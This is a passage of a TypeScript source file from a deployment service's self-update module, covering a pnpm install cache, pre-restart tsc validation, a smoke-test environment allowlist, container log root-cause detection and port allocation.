    localAheadCount,
    remoteAheadSubjects,
    lastSelfUpdate,
    selfUpdateHistory: history,
    activeSelfUpdate,
    webBuildSha,
    webBuildError,
    systemdUnitDrift,
    // 2026-05-07 timing 审视:暴露 daemonReadyAt 让前端判断"上次重启完成时刻"
    // 用于校验 totalElapsedMs 字段。详见 report.cds.self-update-timing-audit.md
    daemonReadyAt,
    runningPid: process.pid,
    pidStartedAt,
    restartStatus,
    bundleStale: bundleFreshness.bundleStale,
    bundleFreshness,
    degraded: degradedReasons.length > 0 ? { reasons: degradedReasons } : null,
    cachedAt: new Date().toISOString(),
  };
}

/**
 * Lockfile-hash fast-path for `pnpm install --frozen-lockfile`.
 *
 * Why this exists (2026-05-07 用户反馈"每次更新 cds 起码要耗时 3 分钟以上"):
 * 即便 `--frozen-lockfile --prefer-offline` 在 node_modules 已就绪时是 no-op,
 * pnpm 仍需要解析 lockfile / 校验 packages.txt / 跑钩子,实测 5-15 秒一次,
 * cds + cds/web 串两轮就是 30-50 秒。但绝大多数 self-update 是纯 .ts 改动,
 * pnpm-lock.yaml + package.json 字节对字节没变,这一段完全可以 skip。
 *
 * 策略:每次成功 install 后把 sha256(lockfile + package.json) 写到
 * node_modules/.cds-install-stamp。下次 install 前对比哈希,匹配且 node_modules
 * 仍在,直接跳过 pnpm 调用。
 *
 * 故障安全:任何读写失败都返回"不能跳",回退到原本的 pnpm install。stamp
 * 文件落在 node_modules 内,rm -rf node_modules 自动清掉(不会误命中)。
 */
function _pnpmInstallStamp(dir: string): string {
  return path.join(dir, 'node_modules', '.cds-install-stamp');
}

function computePnpmInstallHash(dir: string): string {
  try {
    const lock = path.join(dir, 'pnpm-lock.yaml');
    const pkg = path.join(dir, 'package.json');
    const lockBuf = fs.existsSync(lock) ? fs.readFileSync(lock) : Buffer.alloc(0);
    const pkgBuf = fs.existsSync(pkg) ? fs.readFileSync(pkg) : Buffer.alloc(0);
    return createHash('sha256').update(lockBuf).update(pkgBuf).digest('hex').slice(0, 16);
  } catch {
    return '';
  }
}

function canSkipPnpmInstall(dir: string): boolean {
  try {
    if (!fs.existsSync(path.join(dir, 'node_modules'))) return false;
    const want = computePnpmInstallHash(dir);
    if (!want) return false;
    const have = fs.readFileSync(_pnpmInstallStamp(dir), 'utf8').trim();
    return have === want;
  } catch {
    return false;
  }
}

function markPnpmInstallStamp(dir: string): void {
  try {
    const hash = computePnpmInstallHash(dir);
    if (!hash) return;
    fs.writeFileSync(_pnpmInstallStamp(dir), hash);
  } catch {
    /* 写失败下次照样 install,不致命 */
  }
}

/**
 * 包装 `pnpm install --frozen-lockfile --prefer-offline`,命中 stamp 直接返回伪
 * "exitCode 0" 结果(stdout 标记 [skip])。命中失败正常调 shell.exec 并在成功后写 stamp。
 *
 * 返回的 stdout 会以 `[timing] elapsed=NNNms` 开头,调用方可以 grep 出实际耗时
 * 喷到 SSE 让用户看到真实数字(不再靠"我估算 30-50s")。
 */
async function runPnpmInstallWithCache(
  shell: IShellExecutor,
  cwd: string,
): Promise<Awaited<ReturnType<IShellExecutor['exec']>> & { _timing: { ms: number; skipped: boolean } }> {
  const startedAt = Date.now();
  if (canSkipPnpmInstall(cwd)) {
    const ms = Date.now() - startedAt;
    return {
      exitCode: 0,
      stdout: `[timing] elapsed=${ms}ms\n[skip] pnpm install (lockfile hash unchanged)`,
      stderr: '',
      _timing: { ms, skipped: true },
    };
  }
  const result = await shell.exec(
    'pnpm install --frozen-lockfile --prefer-offline --prod=false',
    { cwd, timeout: 300_000 },
  );
  if (result.exitCode === 0) markPnpmInstallStamp(cwd);
  return { ...result, _timing: { ms: Date.now() - startedAt, skipped: false } };
}

/**
 * P4 Part 18 (hardening): pre-restart sanity check for self-update.
 *
 * Runs `pnpm install --frozen-lockfile` + `tsc --noEmit` inside the
 * CDS source dir BEFORE kill+spawn. Returns a structured result
 * that the self-update route uses to decide whether to proceed.
 *
 * Contract:
 *   - ok: true  → both stages succeeded, safe to restart
 *   - ok: false → first failing stage + stderr excerpt in error
 *
 * Why this is in its own function: it's called from two routes
 * (the real /self-update and the dry-run /self-update-dry-run).
 * Both share the exact same validation so an operator who pre-
 * validates gets the same result the live restart would.
 *
 * Timeouts:
 *   pnpm install — 300s (cold install can take a while on slow disks)
 *   tsc          — 120s (CDS is ~5k LOC, should finish in <10s)
 *
 * On a healthy CDS these run in 3-8 seconds combined because
 * frozen-lockfile is a near no-op when node_modules is current.
 */
/**
 * timings 字段:每段实际耗时(ms),skip 路径以 `_skip` 后缀标识。调用方
 * 可以直接喷到 SSE 让用户看到真实数字 —— 不靠估算,不靠 explore agent
 * 的二手报告。`total_ms` 是整个 validateBuildReadiness 的 wall-clock。
 */
export type ValidateTimings = Record<string, number>;
export type ValidateProgressEvent = {
  phase: 'validate-install' | 'validate-tsc' | 'validate-done';
  status: 'running' | 'done' | 'warning' | 'error' | 'info';
  message: string;
  timings?: ValidateTimings;
};
type ValidateBuildOptions = {
  skipTsc?: boolean;
  onProgress?: (event: ValidateProgressEvent) => void;
};

function formatValidationTimings(timings: ValidateTimings): string {
  return Object.entries(timings)
    .filter(([k]) => k.endsWith('_ms'))
    .map(([k, v]) => {
      const skipped = !!timings[k.replace('_ms', '_skipped')];
      return `${k.replace('_ms', '')}=${v}ms${skipped ? '(skip)' : ''}`;
    })
    .join(' · ');
}

const SELF_UPDATE_BUSY_STALE_MS = 90_000;
const SELF_UPDATE_TIMING_KEYS: Record<string, keyof SelfUpdateTimingBreakdown> = {
  fetch: 'fetchMs',
  checkout: 'checkoutMs',
  pull: 'pullMs',
  reset: 'resetMs',
  'nginx-render': 'nginxRenderMs',
  analyze: 'analyzeMs',
  validate: 'validateMs',
  'validate-install': 'validateInstallMs',
  'validate-tsc': 'validateTscMs',
  cache: 'cacheMs',
  'build-backend': 'buildBackendMs',
  'web-build': 'webBuildMs',
  'web-only': 'webOnlyMs',
  'doc-only': 'docOnlyMs',
  'no-op': 'noOpMs',
  restart: 'restartMs',
};

function isSelfUpdateBusy(active: ActiveSelfUpdate | null): boolean {
  if (!active || active.interrupted) return false;
  const tickMs = Date.parse(active.lastTickAt || active.startedAt);
  if (!Number.isFinite(tickMs)) return true;
  return Date.now() - tickMs < SELF_UPDATE_BUSY_STALE_MS;
}

function createSelfUpdateTimingRecorder(startedAt: number) {
  const timings: SelfUpdateTimingBreakdown = {};
  const phaseStarts = new Map<string, number>();
  const mark = (step: string, status: string): void => {
    const key = SELF_UPDATE_TIMING_KEYS[step];
    if (!key) return;
    if (status === 'running') {
      if (!phaseStarts.has(step)) phaseStarts.set(step, Date.now());
      return;
    }
    if (status === 'done' || status === 'error' || status === 'warning') {
      const phaseStartedAt = phaseStarts.get(step);
      if (phaseStartedAt !== undefined && timings[key] === undefined) {
        timings[key] = Date.now() - phaseStartedAt;
      }
    }
  };
  const merge = (extra?: Partial<SelfUpdateTimingBreakdown>): void => {
    if (!extra) return;
    Object.assign(timings, extra);
  };
  const mergeValidation = (validationTimings?: ValidateTimings): void => {
    if (!validationTimings) return;
    timings.validate = { ...validationTimings };
    if (typeof validationTimings.total_ms === 'number') timings.validateMs = validationTimings.total_ms;
    if (typeof validationTimings.install_cds_ms === 'number' || typeof validationTimings.install_web_ms === 'number') {
      timings.validateInstallMs = Math.max(
        validationTimings.install_cds_ms || 0,
        validationTimings.install_web_ms || 0,
      );
    }
    if (typeof validationTimings.tsc_cds_ms === 'number' || typeof validationTimings.tsc_web_ms === 'number') {
      timings.validateTscMs = Math.max(
        validationTimings.tsc_cds_ms || 0,
        validationTimings.tsc_web_ms || 0,
      );
    }
  };
  const snapshot = (): SelfUpdateTimingBreakdown => ({
    ...timings,
    totalMs: Date.now() - startedAt,
  });
  return { mark, merge, mergeValidation, snapshot };
}

export async function validateBuildReadiness(
  shell: IShellExecutor,
  cdsDir: string,
  options: ValidateBuildOptions = {},
): Promise<
  | { ok: true; summary: string; webWarning?: string; timings: ValidateTimings }
  | { ok: false; stage: 'install' | 'tsc'; error: string; timings: ValidateTimings }
> {
  const validateStartedAt = Date.now();
  const timings: ValidateTimings = {};
  // 用户反馈 2026-05-06:验证 75-95s 太慢。原因:cds + cds/web 各跑 pnpm install
  // + tsc --noEmit 共 4 步串行。改成 Promise.all 两两并行 → 期望 50% 缩减。
  // - 后端 tsc 失败 → node 起不来 → CDS 死翘 → 必须 abort
  // - 前端 tsc 失败 → web build 也会失败 → 老 dist/ 继续 serve → bundleStale 徽章
  //   只算 webWarning,self-update 继续。
  const webDir = path.join(cdsDir, 'web');
  const webExists = fs.existsSync(path.join(webDir, 'package.json'));
  const progress = options.onProgress ?? (() => {});

  // Round 1: pnpm install --frozen-lockfile (cds + cds/web 并行)
  // 走 runPnpmInstallWithCache —— lockfile/package.json 哈希命中 stamp 时
  // 直接返回 exitCode=0 [skip],不调用 pnpm。每段 ms 写入 timings。
  progress({
    phase: 'validate-install',
    status: 'running',
    message: webExists
      ? '依赖校验中: pnpm install (cds + web 并行)'
      : '依赖校验中: pnpm install (cds)',
  });
  const [installResult, webInstallResult] = await Promise.all([
    runPnpmInstallWithCache(shell, cdsDir),
    webExists ? runPnpmInstallWithCache(shell, webDir) : Promise.resolve(null),
  ]);
  timings['install_cds_ms'] = installResult._timing.ms;
  timings[installResult._timing.skipped ? 'install_cds_skipped' : 'install_cds_ran'] = 1;
  if (webInstallResult) {
    timings['install_web_ms'] = webInstallResult._timing.ms;
    timings[webInstallResult._timing.skipped ? 'install_web_skipped' : 'install_web_ran'] = 1;
  }

  if (installResult.exitCode !== 0) {
    const err = (combinedOutput(installResult) || 'pnpm install 失败').slice(0, 500);
    timings['total_ms'] = Date.now() - validateStartedAt;
    progress({
      phase: 'validate-install',
      status: 'error',
      message: `依赖校验失败: ${formatValidationTimings(timings)}`,
      timings: { ...timings },
    });
    return { ok: false, stage: 'install', error: err, timings };
  }

  let webWarning: string | undefined;
  if (webInstallResult && webInstallResult.exitCode !== 0) {
    webWarning = 'web pnpm install 失败 — web build 大概率会跟着失败,继续 self-update 但前端可能不更新';
  }
  // #746 guard #3 — 真实 boot 预检(boot install smoke)。
  // runPnpmInstallWithCache 在 lockfile 哈希命中 stamp 时直接 skip,不跑真正的
  // `pnpm install`。但 master-run 启动时跑的是**未缓存的** `pnpm install
  // --frozen-lockfile --prefer-offline`,这条会在 pnpm 11 的 ERR_PNPM_IGNORED_BUILDS
  // (未批准 native build)等 gate 上 exit 1 → master-run exit 78 → systemd 崩溃循环。
  // 2026-06-08 两次 502 事故(CI=true / pnpm-workspace.yaml 占位字符串)都是从这个
  // 缓存 skip 的缝里溜过去的:tsc 过了、cached install skip 了,真实启动才崩。
  //
  // 只在上面 helper **跳过了真实 install**(命中缓存 stamp)时才补跑这条 boot 预检:
  // 那才是"真实 pnpm install 行为尚未被验证"的危险缝隙。若 helper 本轮已经用**同一条**
  // 命令真实跑过且成功,再跑第二遍纯属重复(双倍 install 时间 + 第二次偶发失败可能误伤),
  // helper 自己那次就已经是等价的 boot 预检了。
  if (installResult._timing.skipped) {
    const bootInstall = await shell.exec(
      'pnpm install --frozen-lockfile --prefer-offline --prod=false',
      { cwd: cdsDir, timeout: 240_000 },
    );
    if (bootInstall.exitCode !== 0) {
      const err = (combinedOutput(bootInstall) || 'boot install 失败').slice(0, 600);
      timings['total_ms'] = Date.now() - validateStartedAt;
      progress({
        phase: 'validate-install',
        status: 'error',
        message: `boot 预检失败(master-run 的 pnpm install 会崩,已阻止 swap): ${formatValidationTimings(timings)}`,
        timings: { ...timings },
      });
      return {
        ok: false,
        stage: 'install',
        error: `boot 预检失败 — master-run 启动时的 \`pnpm install --frozen-lockfile --prefer-offline\` 退出非零(若放行将导致 systemd 崩溃循环 502): ${err}`,
        timings,
      };
    }
  }

  progress({
    phase: 'validate-install',
    status: webWarning ? 'warning' : 'done',
    message: `依赖校验完成: ${formatValidationTimings(timings)}`,
    timings: { ...timings },
  });

  // 警告 Bugbot 9095dfbb + 1f4db209:hot path 调用方传 skipTsc=true,因为
  // self-force-sync 下游会跑 esbuild + tsc --noEmit 并行(line 9020-),那一步等
  // 价于这里的 tsc round。**仍然要跑 pnpm install** — 新 .ts 文件 import 一个
  // 已声明但没装的 dep 时 esbuild 会失败,`pnpm install --frozen-lockfile`
  // 是 5s 的 no-op(快路径,lockfile 一致时只校验)修复 node_modules 残缺。
  if (options.skipTsc) {
    timings['total_ms'] = Date.now() - validateStartedAt;
    progress({
      phase: 'validate-done',
      status: webWarning ? 'warning' : 'done',
      message: `预检完成: ${formatValidationTimings(timings)}`,
      timings: { ...timings },
    });
    return {
      ok: true,
      summary: webWarning
        ? `pnpm install 通过 — 警告 web install 失败(self-update 继续)`
        : 'pnpm install 通过(hot path,tsc 由后续 esbuild + tsc --noEmit 并行兜底)',
      webWarning,
      timings,
    };
  }

  // Round 2: tsc --noEmit (cds + cds/web 并行,后者仅在 web install 通过时跑)
  // tsc 子树锚点 fast-path:cds/src 子树自上次成功 tsc 以来没变过 → 跳过 tsc。
  // 与 .web-input-sha 同思路:用 `git log -1 --format=%H HEAD -- <paths>` 锚点。
  // 第一次 self-update 写 stamp,从第二次开始命中。tsc 增量本身已是 5-15s,
  // 但纯后端非 .ts 提交(如 changelog / doc / cds/web 改动)走这条 0s,叠加效益可观。
  const repoRoot = path.resolve(cdsDir, '..');
  const tscStampFile = path.join(cdsDir, 'dist', '.tsc-input-sha');
  const webTscStampFile = path.join(webDir, '.tsc-input-sha');
  let cdsLastTscChange = '';
  try {
    cdsLastTscChange = (await shell.exec(
      // Bugbot 3c1b5d9 反馈:之前漏了 pnpm-lock.yaml,`pnpm update` 在 semver 范围内
      // 能改 lockfile 而不动 package.json,导致新装的 .d.ts 类型变化逃过 tsc 检测。
      'git log -1 --format=%H HEAD -- cds/src cds/tsconfig.json cds/package.json cds/pnpm-lock.yaml',
      { cwd: repoRoot },
    )).stdout.trim();
  } catch { /* 失败就走正式 tsc */ }
  let webLastTscChange = '';
  if (webExists) {
    try {
      webLastTscChange = (await shell.exec(
        'git log -1 --format=%H HEAD -- cds/web/src cds/web/tsconfig.json cds/web/package.json cds/web/pnpm-lock.yaml',
        { cwd: repoRoot },
      )).stdout.trim();
    } catch { /* */ }
  }
  const cdsCachedTscSha = (() => { try { return fs.readFileSync(tscStampFile, 'utf8').trim(); } catch { return ''; } })();
  const webCachedTscSha = (() => { try { return fs.readFileSync(webTscStampFile, 'utf8').trim(); } catch { return ''; } })();
  const skipCdsTsc = !!cdsLastTscChange && cdsCachedTscSha === cdsLastTscChange;
  const runWebTsc = webExists && webInstallResult && webInstallResult.exitCode === 0;
  const skipWebTsc = runWebTsc && !!webLastTscChange && webCachedTscSha === webLastTscChange;
  const cdsTscTimeoutMs = Math.max(120_000, Number.parseInt(process.env.CDS_SELF_UPDATE_TSC_TIMEOUT_MS || '300000', 10) || 300_000);
  const webTscTimeoutMs = Math.max(180_000, Number.parseInt(process.env.CDS_SELF_UPDATE_WEB_TSC_TIMEOUT_MS || '300000', 10) || 300_000);
  progress({
    phase: 'validate-tsc',
    status: 'running',
    message: runWebTsc
      ? '类型校验中: tsc --noEmit (cds + web 并行)'
      : '类型校验中: tsc --noEmit (cds)',
    timings: { ...timings },
  });

  // tsc 各自独立计时:每个 promise 内部用自己的 t0 包出 { result, ms } 元组,
  // 这样 Promise.all 完成后两个 ms 反映各自实际耗时,而不是 wall-clock 总长。
  // (Bugbot d5ad90f 抓到的低风险:之前 tscCdsStart / tscWebStart 都在 Promise.all
  //  外同步取,Date.now() - X 都等于 max(cds_ms, web_ms),telemetry 失真)
  const timed = async <T>(fn: () => Promise<T>): Promise<{ result: T; ms: number }> => {
    const t0 = Date.now();
    const result = await fn();
    return { result, ms: Date.now() - t0 };
  };
  const [tscCdsTimed, tscWebTimed] = await Promise.all([
    timed<Awaited<ReturnType<typeof shell.exec>>>(() =>
      skipCdsTsc
        ? Promise.resolve({ exitCode: 0, stdout: '[skip] tsc cds (input sha unchanged)', stderr: '' })
        : shell.exec('./node_modules/.bin/tsc --noEmit', { cwd: cdsDir, timeout: cdsTscTimeoutMs }),
    ),
    runWebTsc
      ? timed<Awaited<ReturnType<typeof shell.exec>>>(() =>
          skipWebTsc
            ? Promise.resolve({ exitCode: 0, stdout: '[skip] tsc web (input sha unchanged)', stderr: '' })
            : shell.exec('./node_modules/.bin/tsc --noEmit', { cwd: webDir, timeout: webTscTimeoutMs }),
        )
      : Promise.resolve(null),
  ]);
  const tscResult = tscCdsTimed.result;
  const webTscResult = tscWebTimed?.result ?? null;
  timings['tsc_cds_ms'] = tscCdsTimed.ms;
  timings[skipCdsTsc ? 'tsc_cds_skipped' : 'tsc_cds_ran'] = 1;
  if (runWebTsc && tscWebTimed) {
    timings['tsc_web_ms'] = tscWebTimed.ms;
    timings[skipWebTsc ? 'tsc_web_skipped' : 'tsc_web_ran'] = 1;
  }

  if (tscResult!.exitCode !== 0) {
    const err = (combinedOutput(tscResult!) || 'tsc --noEmit 失败').slice(0, 800);
    timings['total_ms'] = Date.now() - validateStartedAt;
    progress({
      phase: 'validate-tsc',
      status: 'error',
      message: `后端类型校验失败: ${formatValidationTimings(timings)}`,
      timings: { ...timings },
    });
    return { ok: false, stage: 'tsc', error: err, timings };
  }
  // tsc 通过且不是 skip 路径才写 stamp(skip 路径不需要重写)
  if (!skipCdsTsc && cdsLastTscChange) {
    try { fs.writeFileSync(tscStampFile, cdsLastTscChange + '\n'); } catch { /* */ }
  }

  if (runWebTsc && webTscResult && webTscResult.exitCode !== 0) {
    const tail = (combinedOutput(webTscResult) || '').slice(-800);
    webWarning = `前端 tsc 失败(self-update 继续,但前端 bundle 不会更新): ${tail}`;
  } else if (runWebTsc && !skipWebTsc && webLastTscChange) {
    try { fs.writeFileSync(webTscStampFile, webLastTscChange + '\n'); } catch { /* */ }
  }
  progress({
    phase: 'validate-tsc',
    status: webWarning ? 'warning' : 'done',
    message: `类型校验完成: ${formatValidationTimings(timings)}`,
    timings: { ...timings },
  });

  timings['total_ms'] = Date.now() - validateStartedAt;
  progress({
    phase: 'validate-done',
    status: webWarning ? 'warning' : 'done',
    message: `预检完成: ${formatValidationTimings(timings)}`,
    timings: { ...timings },
  });
  return {
    ok: true,
    summary: webWarning
      ? `pnpm install + 后端 tsc 通过 — 警告 前端检查未过(self-update 继续)`
      : 'pnpm install + 后端 tsc + 前端 tsc 通过',
    webWarning,
    timings,
  };
}

/**
 * Build the env object passed to smoke-all.sh. Whitelists shell-required
 * vars (PATH/HOME/...) + the SMOKE_* parameters + AI_ACCESS_KEY (note:
 * this is the project-level access key the smoke script feeds to the
 * target backend, not CDS's own CDS_AI_ACCESS_KEY).
 *
 * Reasons for the whitelist (instead of `...process.env, ...overrides`):
 *   - CDS process holds many sensitive vars (CDS_GITHUB_APP_PRIVATE_KEY,
 *     CDS_JWT_SECRET, CDS_BOOTSTRAP_TOKEN, CDS_MONGO_URI, ...). The smoke
 *     script doesn't need any of them; leaking them risks them ending up
 *     in stderr lines forwarded to SSE.
 *   - The whitelist makes "what the smoke script can see" auditable. New
 *     smoke needs a new env? Add it here, document the dependency.
 */
function buildSmokeEnv(opts: {
  previewHost: string;
  accessKey: string;
  impersonateUser?: string;
  skip?: string;
  failFast?: boolean;
}): NodeJS.ProcessEnv {
  const SHELL_PASSTHROUGH = ['PATH', 'HOME', 'USER', 'SHELL', 'TERM', 'TZ', 'TMPDIR', 'PWD', 'LANG'];
  const env: NodeJS.ProcessEnv = {};
  for (const key of SHELL_PASSTHROUGH) {
    if (process.env[key] !== undefined) env[key] = process.env[key];
  }
  // LC_*（locale 全套）放过，否则部分 awk/sort 报错
  for (const key of Object.keys(process.env)) {
    if (key.startsWith('LC_')) env[key] = process.env[key];
  }
  env.SMOKE_TEST_HOST = opts.previewHost;
  // AI_ACCESS_KEY here is the *project-level* key (用户在 dashboard
  // customEnv 里配的，给被测项目自己的 X-AI-Access-Key 用)，
  // 不要换成 CDS_AI_ACCESS_KEY —— 那是 CDS 自己的钥匙。
  env.AI_ACCESS_KEY = opts.accessKey;
  env.SMOKE_USER = opts.impersonateUser || 'admin';
  env.SMOKE_SKIP = opts.skip || '';
  env.SMOKE_FAIL_FAST = opts.failFast ? '1' : '';
  return env;
}

export function clearRunningServiceErrorMessages(entry: Pick<BranchEntry, 'services'>): void {
  for (const svc of Object.values(entry.services || {})) {
    if (svc.status === 'running' && svc.errorMessage) {
      svc.errorMessage = undefined;
    }
  }
}

function reconcileBranchStatus(entry: BranchEntry): void {
  clearRunningServiceErrorMessages(entry);
  const statuses = Object.values(entry.services || {}).map((service) => service.status);
  const previousStatus = entry.status;
  if (statuses.some((status) => status === 'error')) entry.status = 'error';
  else if (statuses.some((status) => status === 'building')) entry.status = 'building';
  else if (statuses.some((status) => status === 'starting' || status === 'restarting')) entry.status = 'starting';
  else if (statuses.some((status) => status === 'running')) entry.status = 'running';
  else entry.status = 'idle';

  // 2026-05-14: 进入 running 时打 lastReadyAt 戳。项目级 autoPublishAfterMinutes /
  // autoPublishAfterMinutes 调度器以本字段为计时起点。从非 running 翻到 running 才更新，
  // 内部 running→running（多次 reconcile）不刷新，避免调度器永远被推迟。
  const readyMs = entry.lastReadyAt ? Date.parse(entry.lastReadyAt) : 0;
  const stoppedMs = entry.lastStoppedAt ? Date.parse(entry.lastStoppedAt) : 0;
  if (entry.status === 'running' && (previousStatus !== 'running' || (stoppedMs > 0 && stoppedMs >= readyMs))) {
    entry.lastReadyAt = new Date().toISOString();
  }

  const failedReasons = Object.entries(entry.services || {})
    .filter(([, service]) => service.status === 'error')
    .map(([id, service]) => `${id}: ${service.errorMessage || '启动失败'}`);
  entry.errorMessage = failedReasons.length ? failedReasons.join('\n') : undefined;
}

function isPortConflictError(err: unknown): boolean {
  const text = err instanceof Error ? err.message : String(err);
  return /port is already allocated|bind: address already in use|address already in use|EADDRINUSE/i.test(text);
}

/**
 * 从容器日志里抽取"真正的根因"——构建/编译失败、依赖缺失、进程崩溃等。
 *
 * 背景:就绪探测超时(容器起了但端口不响应)往往只是**症状**,容器日志里早已写明
 * 真实**根因**(如 C# 编译错误 `error CS0101`)。历史实现把顶层 errorMessage 钉死成
 * "就绪探测超时:容器已启动但端口未在超时时间内响应",既没点出代码编译失败,也让前端
 * 归类器把它落到"未分类错误/未识别",用户误以为是 CDS 自身的问题。本函数把根因从日志
 * 里捞出来,供 errorMessage 丰富 + failure-diagnosis 归类共用(单一数据源)。
 */
export type ContainerFatalSide = 'code' | 'config' | 'cds';
export interface ContainerFatalCause {
  /** 给用户看的一句话根因(已去掉 docker --timestamps 注入的时间戳前缀) */
  summary: string;
  side: ContainerFatalSide;
  /** 与 failure-diagnosis 的 Category 对齐 */
  category: string;
}

export function detectContainerFatalCause(logText: string): ContainerFatalCause | null {
  if (!logText || !logText.trim()) return null;
  const lines = logText
    .split('\n')
    .map((l) => l.trim())
    // 去掉 `docker logs --timestamps` 注入的 ISO 时间戳前缀,只留正文
    .map((l) => l.replace(/^\d{4}-\d{2}-\d{2}T[\d:.]+Z\s+/, ''))
    .filter(Boolean);
  if (lines.length === 0) return null;
  const PATTERNS: Array<{ re: RegExp; side: ContainerFatalSide; category: string; label: string }> = [
    { re: /\berror\s+CS\d{3,5}\b/i, side: 'code', category: 'build-failed', label: '构建失败 · C# 编译错误' },
    { re: /\berror\s+TS\d{3,5}\b/i, side: 'code', category: 'build-failed', label: '构建失败 · TypeScript 编译错误' },
    { re: /:\s*error\s+MSB\d{3,5}\b|Build FAILED|构建失败/i, side: 'code', category: 'build-failed', label: '构建失败 · MSBuild/编译' },
    { re: /Cannot find module|MODULE_NOT_FOUND|Cannot find package/i, side: 'code', category: 'missing-deps', label: '依赖缺失 · 模块未找到' },
    { re: /ModuleNotFoundError|ImportError\b/i, side: 'code', category: 'missing-deps', label: '依赖缺失 · Python 模块未找到' },
    { re: /\bpanic:/i, side: 'code', category: 'crashed', label: '进程崩溃 · panic' },
    { re: /Unhandled exception|未经处理的异常|Traceback \(most recent call last\)/i, side: 'code', category: 'crashed', label: '进程崩溃 · 未处理异常' },
    { re: /address already in use|EADDRINUSE|port is already allocated/i, side: 'config', category: 'port-conflict', label: '端口被占用' },
  ];
  for (const p of PATTERNS) {
    const hit = lines.find((l) => p.re.test(l));
    if (hit) {
      const trimmed = hit.length > 220 ? `${hit.slice(0, 220)}…` : hit;
      return { summary: `${p.label}：${trimmed}`, side: p.side, category: p.category };
    }
  }
  return null;
}

/**
 * 就绪探测超时时,优先去容器日志里找真实根因。找到就把根因点名到 errorMessage,
 * 找不到才降级到通用文案。最多拉 80 行,拉取失败静默降级。
 */
async function buildReadinessTimeoutMessage(
  containerService: ContainerService,
  containerName: string,
): Promise<string> {
  const fallback = '就绪探测超时：容器已启动但端口未在超时时间内响应';
  try {
    const logs = await containerService.getLogs(containerName, 80);
    const cause = detectContainerFatalCause(logs);
    if (cause) {
      const sideLabel = cause.side === 'code' ? '代码侧' : cause.side === 'config' ? '配置侧' : 'CDS 侧';
      return `容器进程未监听端口（${sideLabel}根因）：${cause.summary}。修复后需重新部署。`;
    }
  } catch {
    // 容器名不存在 / docker 拉不到日志 — 静默降级到通用文案
  }
  return fallback;
}

/**
 * 给 GitHub check-run 的失败 output 生成"根因 + 容器日志尾部"markdown。
 *
 * 为什么:agent 跑在沙箱里(无 CDS 网络白名单 / 无 AI_ACCESS_KEY)时根本拉不到
 * 容器日志,只能跪求用户手动贴。但 CDS 本来就把构建状态推回 GitHub PR Check,
 * 而 agent 通过 GitHub 是够得着的。把真实根因(如 error CS0101)+ 容器日志尾部
 * 写进 check-run 的 output.text,agent 不需要任何 CDS 凭据/网络就能读到根因。
 *
 * 无 error 服务时返回空串(调用方据此决定是否传 failureDetail)。
 */
export async function buildCheckRunFailurePostmortem(
  entry: Pick<BranchEntry, 'services'>,
  containerService: Pick<ContainerService, 'getLogs'>,
  // 只对「本次 startup-plan 里的活跃服务」做诊断。传入 activeProfileIds 时,过滤掉
  // 已被删/改名残留的 zombie 服务(deploy 主路径用 activeServices 算 hasError,这里
  // 必须同口径),否则 check-run 会把旧 profile 的日志当成本次失败的根因误导 agent。
  activeProfileIds?: ReadonlySet<string>,
): Promise<string> {
  const errorServices = Object.entries(entry.services || {}).filter(
    ([sid, svc]) => svc.status === 'error' && (!activeProfileIds || activeProfileIds.has(sid)),
  );
  if (errorServices.length === 0) return '';
  const sections: string[] = [];
  for (const [profileId, svc] of errorServices) {
    let logs = '';
    try {
      logs = await containerService.getLogs(svc.containerName, 60);
    } catch {
      // 容器名不存在 / docker 拉不到 — 仍用 errorMessage 作为根因兜底
    }
    const cause = logs ? detectContainerFatalCause(logs) : null;
    const sideLabel = cause
      ? (cause.side === 'code' ? '代码侧' : cause.side === 'config' ? '配置侧' : 'CDS 侧')
      : '未识别';
    const rootCause = cause?.summary || svc.errorMessage || '启动失败';
    const lines = [`- **${profileId}**（${sideLabel}）：${rootCause}`];
    const tail = logs
      .split('\n')
      .map((l) => l.replace(/^\d{4}-\d{2}-\d{2}T[\d:.]+Z\s+/, ''))
      .filter((l) => l.trim())
      .slice(-25)
      .join('\n');
    if (tail) {
      lines.push('', `<details><summary>${profileId} 容器日志尾部</summary>`, '', '```', tail, '```', '</details>');
    }
    sections.push(lines.join('\n'));
  }
  return ['### 失败根因（CDS 自动诊断）', '', ...sections].join('\n');
}

function parseListenPorts(output: string): Set<number> {
  const ports = new Set<number>();
  for (const line of output.split('\n')) {
    const parts = line.trim().split(/\s+/);
    if (parts.length < 4) continue;
    const local = parts[3];
    const match = local.match(/:(\d+)$/);
    if (!match) continue;
    const port = Number(match[1]);
    if (Number.isInteger(port) && port > 0 && port <= 65535) ports.add(port);
  }
  return ports;
}

async function collectListeningPorts(shell: IShellExecutor): Promise<Set<number>> {
  const result = await shell.exec('ss -H -ltn').catch(() => null);
  if (!result || result.exitCode !== 0) return new Set();
  return parseListenPorts(result.stdout);
}

function routeShellQuote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

function dockerNameSafeHash(parts: string[]): string {
  return createHash('sha1').update(parts.join('\n')).digest('hex').slice(0, 20);
}

function resourceExternalProxyName(projectId: string, branchId: string, resourceId: string): string {
  return `cds-ext-${dockerNameSafeHash([projectId, branchId, resourceId])}`;
}

function resourceExternalFirewallChain(projectId: string, branchId: string, resourceId: string): string {
  return `CDS_EXT_${dockerNameSafeHash([projectId, branchId, resourceId]).slice(0, 16).toUpperCase()}`;
}

function resourceExternalPortRange(): { start: number; end: number } {
  const startRaw = Number(process.env.CDS_RESOURCE_TCP_PORT_START);
  const endRaw = Number(process.env.CDS_RESOURCE_TCP_PORT_END);
  const start = Number.isFinite(startRaw) && startRaw >= 1024 && startRaw <= 65000 ? Math.floor(startRaw) : 43000;
  const end = Number.isFinite(endRaw) && endRaw >= start && endRaw <= 65535 ? Math.floor(endRaw) : Math.min(65535, start + 1999);
  return { start, end };
}

async function allocateResourceExternalPort(shell: IShellExecutor, preferred?: number): Promise<number> {
  const used = await collectListeningPorts(shell);
  const { start, end } = resourceExternalPortRange();
  if (preferred && preferred >= 1024 && preferred <= 65535 && !used.has(preferred)) return preferred;
  for (let port = start; port <= end; port += 1) {
    if (!used.has(port)) return port;
  }
  throw new Error(`资源公网 TCP 端口池已耗尽：${start}-${end}`);
}

function normalizeIpv4Allowlist(input: unknown): string[] {
  if (!Array.isArray(input)) return [];
  const result: string[] = [];
  for (const raw of input.slice(0, 20)) {
    const item = String(raw || '').trim();
    if (!item) continue;
    const [ip, prefixRaw] = item.split('/');
    if (isIP(ip) !== 4) {
      throw new Error(`IP allowlist 目前仅支持 IPv4/CIDR：${item}`);
    }
    if (prefixRaw !== undefined) {
      const prefix = Number(prefixRaw);
